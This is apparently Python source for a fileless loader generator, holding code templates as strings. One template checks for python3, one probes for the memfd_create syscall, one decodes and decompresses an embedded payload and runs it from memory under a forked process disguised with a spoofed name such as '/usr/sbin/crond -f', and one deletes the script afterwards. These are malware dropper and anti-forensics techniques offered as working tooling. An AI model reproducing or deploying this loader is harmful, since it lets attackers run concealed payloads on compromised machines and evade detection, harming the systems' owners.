command_existence = '''
def check_command_existence(cmd):
    """
    Verifies that a given command exists on the machine.
    :param cmd: The command whose existence we want to check.
    :return: True if the command is present on the system, False otherwise.
    """
    output = os.system("command -v %s >/dev/null" % cmd)
    if int(output) == 0:
        return 0
    else:
        return 1
'''

memfd = '''
def assert_memfd():
    result = os.system("python3 -c \\"import ctypes;ctypes.CDLL(None).syscall(319, '', 0)\\"")
    if int(result) == -1:
        raise RuntimeError("[!] The remote kernel doesn't support the create_memfd syscall!")
        # handle the exit here, just terminate the process
'''

self_delete = '''
def self_delete(script_name):
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print(f"[+] Script '{script_path}' has been self-deleted.")
    except Exception as e:
        print(f"[!] Error during self-deletion: {e}")
'''

load = '''
def load(args, p):

    x = base64.b64decode(p)
    #z = zlib.decompress(x.encode('utf-8'), 9)
    z = zlib.decompress(x)

    fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
    os.write(fd, base64.b64decode(z))
    arguments = [args]
    try:
        # need to find a better child process to blend as 
        pid = os.fork()
        if pid > 0:
            print("[+] Child process PID --> %i" % pid)
        else:
            #os.setsid()
            print("[+] /proc/self/fd/%i --> %s" % (fd, arguments))
            # print("[+] /proc/self/fd/%i -->" %fd, arguments)
            os.execv("/proc/self/fd/%i" % fd, arguments)
        return pid
    except Exception as e:
        print("[!] Execution failed (%s)!" % str(e))
        return -1
'''

main = '''
if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-c",
        "--cmdline",
        action="store",
        dest="cmdline",
        help="The cmdline to appear as e.x. '/usr/sbin/crond -f'",
    )

    args = parser.parse_args()

    if not args.cmdline:
        print(f"[!] python3 {sys.argv[0]} -c '/usr/sbin/crond -f")
        sys.exit(4)

    if check_command_existence("python3") == 0:
        print("[+] Python3 detecting...proceeding")

        assert_memfd()
        pid = load(args.cmdline, p)
        if pid == -1:
            print("[!] loading appeared to fail...")
        else:
            self_delete(sys.argv[0])
    else: 
        print("[!] python3 not detected on the system, exiting...")
'''